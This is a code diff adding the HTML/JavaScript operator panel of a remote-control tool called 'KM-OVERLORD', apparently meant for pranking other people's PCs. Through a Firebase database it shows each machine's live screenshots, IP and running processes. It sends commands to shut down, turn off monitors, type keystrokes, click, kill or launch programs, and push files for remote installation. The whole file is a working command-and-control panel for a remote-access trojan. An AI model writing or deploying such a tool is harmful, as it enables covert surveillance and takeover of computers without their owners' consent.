@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <title>KM-OVERLORD V3.0 FINAL</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; padding: 20px; }
+        h1 { text-align: center; text-shadow: 0 0 10px #0f0; }
+        
+        /* 메인 그리드 */
+        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; }
+        .pc-card { border: 2px solid #0f0; background: #111; padding: 15px; cursor: pointer; border-radius: 5px; }
+        .pc-card:hover { box-shadow: 0 0 15px #0f0; }
+        .pc-card.offline { border-color: #444; color: #444; }
+        .screen-img { width: 100%; border: 1px solid #333; margin-top: 10px; }
+
+        /* 모달 상세창 */
+        #modal { display:none; position:fixed; top:2%; left:2%; width:96%; height:92%; background: #0a0a0a; border: 3px solid #0f0; z-index: 100; padding: 20px; box-shadow: 0 0 100px #000; overflow-y: auto; }
+        .control-panel { display: flex; gap: 20px; flex-wrap: wrap; }
+        .side-panel { flex: 1; min-width: 300px; background: #151515; padding: 15px; border-radius: 10px; }
+        
+        /* 프로세스 리스트 스타일 */
+        #proc-list { width: 100%; height: 200px; background: #000; color: #0f0; border: 1px solid #0f0; font-size: 12px; margin-bottom: 10px; }
+        
+        input, button { background: #000; color: #0f0; border: 1px solid #0f0; padding: 8px; margin: 5px 0; width: 100%; box-sizing: border-box; }
+        button:hover { background: #0f0; color: #000; cursor: pointer; }
+        .danger { border-color: #f00; color: #f00; }
+        .danger:hover { background: #f00; color: #fff; }
+        
+        .drop-zone { border: 2px dashed #0f0; padding: 20px; text-align: center; margin-top: 10px; font-size: 12px; }
+        .close-btn { color: #f00; float: right; cursor: pointer; font-size: 30px; }
+    </style>
+</head>
+<body>
+
+    <h1>[ KM-OVERLORD V3.0 CONTROL CENTER ]</h1>
+    <div id="pc-grid" class="grid"></div>
+
+    <div id="modal">
+        <span class="close-btn" onclick="closeModal()">&times;</span>
+        <h2 id="modal-title">PC CONTROL</h2>
+        
+        <div class="control-panel">
+            <div style="flex: 2; min-width: 450px;">
+                <img id="modal-screen" style="width:100%; border:1px solid #0f0; cursor:crosshair;" onclick="handleRemoteClick(event)">
+                <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px; margin-top:10px;">
+                    <button onclick="sendCmd('screen_off')">모니터 끄기</button>
+                    <button onclick="sendCmd('url', prompt('열고 싶은 사이트 주소(URL)를 입력하세요:'))">🌐 브라우저 열기 (URL)</button>
+                    <button class="danger" onclick="if(confirm('진짜 끌 거야?')) sendCmd('shutdown')">PC 종료 (30초)</button>
+                    <button onclick="sendCmd('abort_shutdown')">종료 취소</button>
+                    <button onclick="sendCmd('msg', prompt('메시지:'))">메시지 전송</button>
+                </div>
+            </div>
+
+            <div class="side-panel">
+                <label>🏷️ 별명 설정</label>
+                <div style="display:flex; gap:5px;"><input type="text" id="nick-input"><button style="width:60px;" onclick="saveNickname()">저장</button></div>
+
+                <label>⌨️ 키보드 입력</label>
+                <div style="display:flex; gap:5px;"><input type="text" id="type-input"><button style="width:60px;" onclick="sendType()">전송</button></div>
+
+                <label>🚀 프로세스 목록 (선택하여 종료)</label>
+                <select id="proc-list" size="10"></select>
+                <button class="danger" onclick="killSelected()">선택 앱 종료</button>
+                
+                <label style="margin-top:10px; display:block;">📂 앱 실행 (예: notepad)</label>
+                <div style="display:flex; gap:5px;"><input type="text" id="run-input"><button style="width:60px;" onclick="sendCmd('run', document.getElementById('run-input').value)">실행</button></div>
+
+                <div id="drop-zone" class="drop-zone">파일 드롭하여 원격 설치</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const BASE_URL = "https://prank-e1fd9-default-rtdb.firebaseio.com/";
+        let currentPC = "";
+        let nicknames = {};
+        let isTyping = false;
+
+        document.addEventListener('focusin', (e) => { if(e.target.tagName === 'INPUT') isTyping = true; });
+        document.addEventListener('focusout', (e) => { if(e.target.tagName === 'INPUT') isTyping = false; });
+
+        async function updateData() {
+            if (isTyping) return;
+            try {
+                const nRes = await fetch(BASE_URL + "nicknames.json");
+                nicknames = await nRes.json() || {};
+                const pRes = await fetch(BASE_URL + "pcs.json");
+                const pData = await pRes.json();
+                renderGrid(pData);
+            } catch (e) {}
+        }
+
+        function renderGrid(data) {
+            const grid = document.getElementById('pc-grid');
+            grid.innerHTML = '';
+            if (!data) return;
+            for (let id in data) {
+                const pc = data[id];
+                const isOnline = (Date.now()/1000 - pc.last_seen) < 15;
+                const card = document.createElement('div');
+                card.className = `pc-card ${isOnline ? '' : 'offline'}`;
+                card.onclick = () => openModal(id, pc);
+                card.innerHTML = `
+                    <div style="font-weight:bold; color:#fff;">${nicknames[id] || id}</div>
+                    <div style="font-size:10px;">${id} | ${pc.ip || '0.0.0.0'}</div>
+                    <img src="data:image/jpeg;base64,${pc.screen_img}" class="screen-img">
+                `;
+                grid.appendChild(card);
+                if (currentPC === id) {
+                    document.getElementById('modal-screen').src = "data:image/jpeg;base64," + pc.screen_img;
+                    updateProcList(pc.procs);
+                }
+            }
+        }
+
+        function updateProcList(procs) {
+            const list = document.getElementById('proc-list');
+            const currentSelected = list.value;
+            list.innerHTML = '';
+            if (procs) {
+                procs.forEach(p => {
+                    const opt = document.createElement('option');
+                    opt.value = opt.innerText = p;
+                    list.appendChild(opt);
+                });
+            }
+            list.value = currentSelected;
+        }
+
+        function openModal(id, pc) {
+            currentPC = id;
+            document.getElementById('modal').style.display = "block";
+            document.getElementById('modal-title').innerText = "CONTROL: " + (nicknames[id] || id);
+            document.getElementById('nick-input').value = nicknames[id] || "";
+        }
+
+        function closeModal() { document.getElementById('modal').style.display = "none"; currentPC = ""; }
+
+        async function sendCmd(cmd, val = "") {
+            if (!currentPC || val === null) return; // 취소 누르면 중단
+            await fetch(`${BASE_URL}pcs/${currentPC}.json`, {
+                method: 'PATCH',
+                body: JSON.stringify({ "cmd": cmd, "val": val, "is_new": true })
+            });
+        }
+
+        function killSelected() {
+            const val = document.getElementById('proc-list').value;
+            if (val) sendCmd('kill', val);
+        }
+
+        function sendType() {
+            const el = document.getElementById('type-input');
+            sendCmd('type', el.value);
+            el.value = '';
+        }
+
+        async function saveNickname() {
+            const nick = document.getElementById('nick-input').value;
+            await fetch(`${BASE_URL}nicknames/${currentPC}.json`, { method: 'PUT', body: JSON.stringify(nick) });
+            alert("저장됨");
+            updateData();
+        }
+
+        function handleRemoteClick(event) {
+            const img = event.target;
+            const x = Math.round((event.offsetX / img.clientWidth) * 1920);
+            const y = Math.round((event.offsetY / img.clientHeight) * 1080);
+            sendCmd('click', `${x},${y}`);
+        }
+
+        const dz = document.getElementById('drop-zone');
+        dz.ondragover = (e) => { e.preventDefault(); dz.style.background = "#222"; };
+        dz.ondragleave = () => { dz.style.background = "transparent"; };
+        dz.ondrop = (e) => {
+            e.preventDefault();
+            const file = e.dataTransfer.files[0];
+            const reader = new FileReader();
+            reader.onload = async (ev) => {
+                const b64 = ev.target.result.split(',')[1];
+                await fetch(`${BASE_URL}pcs/${currentPC}.json`, {
+                    method: 'PATCH',
+                    body: JSON.stringify({ "file_data": b64, "file_name": file.name, "file_is_new": true })
+                });
+                alert("파일 전송됨!");
+            };
+            reader.readAsDataURL(file);
+        };
+
+        setInterval(updateData, 3000);
+        updateData();
+    </script>
+</body>
+</html>
